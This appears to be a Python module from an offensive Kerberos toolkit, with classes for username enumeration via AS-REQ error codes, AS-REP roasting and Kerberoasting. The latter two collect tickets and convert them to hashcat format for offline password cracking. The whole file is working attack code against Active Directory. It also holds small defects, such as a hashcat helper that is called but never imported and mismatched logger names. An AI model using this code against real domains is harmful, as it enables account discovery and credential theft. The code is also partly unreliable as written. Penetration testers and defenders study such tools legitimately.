#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

from minikerberos.communication import *
from minikerberos.utils import TGSTicket2hashcat
from minikerberos import logger

class KerberosEtypeTest:
	# TODO: implement this
	pass

class KerberosUserEnum:
	def __init__(self, ksoc):
		self.ksoc = ksoc

	def construct_tgt_req(realm, username):
		now = datetime.datetime.utcnow()
		kdc_req_body = {}
		kdc_req_body['kdc-options'] = KDCOptions(set(['forwardable','renewable','proxiable']))
		kdc_req_body['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': [username]})
		kdc_req_body['realm'] = realm.upper()
		kdc_req_body['sname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': ['krbtgt', realm.upper()]})
		kdc_req_body['till'] = now + datetime.timedelta(days=1)
		kdc_req_body['rtime'] = now + datetime.timedelta(days=1)
		kdc_req_body['nonce'] = secrets.randbits(31)
		kdc_req_body['etype'] = [2, 3, 16, 23, 17, 18] #we "support" all MS related enctypes
		
		pa_data_1 = {}
		pa_data_1['padata-type'] = int(PADATA_TYPE('PA-PAC-REQUEST'))
		pa_data_1['padata-value'] = PA_PAC_REQUEST({'include-pac': True}).dump()
		
		kdc_req = {}
		kdc_req['pvno'] = krb5_pvno
		kdc_req['msg-type'] = MESSAGE_TYPE.KRB_AS_REQ.value
		kdc_req['padata'] = [pa_data_1]
		kdc_req['req-body'] = KDC_REQ_BODY(kdc_req_body)
		
		return AS_REQ(kdc_req)

	def run(self, realm, users):
		"""
		Requests a TGT in the name of the users specified in users. 
		Returns a list of usernames that are in the domain.

		realm: kerberos realm (domain name of the corp)
		users: list : list of usernames to test
		"""
		existing_users = []
		for user in users:
			logging.debug('Probing user %s' % user)
			req = KerberosUserEnum.construct_tgt_req(realm, user)
			rep = self.ksoc.sendrecv(req.dump(), throw = False)
			
			if rep.name != 'KRB_ERROR':	
				# user doesnt need preauth, but it exists
				existing_users.append(user)
			
			elif rep.native['error-code'] != KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED.value:
				# any other error means user doesnt exist
				continue
			
			else:
				# preauth needed, only if user exists
				existing_users.append(user)

		return existing_users

class APREPRoast:
	def __init__(self, ksoc):
		self.ksoc = ksoc

	def run(self, creds, override_etype = [23]):
		"""
		Requests TGT tickets for all users specified in the targets list
		creds: list : the users to request the TGT tickets for
		override_etype: list : list of supported encryption types
		"""			
		tgts = []
		for cred in creds:
			try:
				kcomm = KerbrosComm(cred, self.ksoc)
				kcomm.get_TGT(override_etype = override_etype, decrypt_tgt = False)
				tgts.append(kcomm.kerberos_TGT)
			except Exception as e:
				logger.debug('Error while roasting client %s/%s Reason: %s' % (cred.domain, cred.username, str(e)))
				continue

		results = []
		for tgt in tgts:
			results.append(TGTTicket2hashcat(tgt))


		return results

class Kerberoast:
	def __init__(self, ccred, ksoc, kcomm = None):
		self.ccred = ccred
		self.ksoc = ksoc
		self.kcomm = kcomm

	def run(self, targets, override_etype = [2, 3, 16, 23, 17, 18]):
		"""
		Requests TGS tickets for all service users specified in the targets list
		targets: list : the SPN users to request the TGS tickets for
		allhash: bool : Return all enctype tickets, ot just 23
		"""
		if not self.kcomm:
			try:
				self.kcomm = KerbrosComm(self.ccred, self.ksoc)
				self.kcomm.get_TGT()
			except Exception as e:
				logger.exception('Failed to get TGT ticket! Reason: %s' % str(e))
				
		
		tgss = []
		for target in targets:
			try:
				tgs, encTGSRepPart, key = self.kcomm.get_TGS(target, override_etype = override_etype)
				tgss.append(tgs)
			except Exception as e:
				logger.debug('Failed to get TGS ticket for user %s/%s/%s! Reason: %s' % (target.domain, str(target.service), target.username, str(e)))
				continue

		results = []
		for tgs in tgss:
			results.append(TGSTicket2hashcat(tgs))


		return results
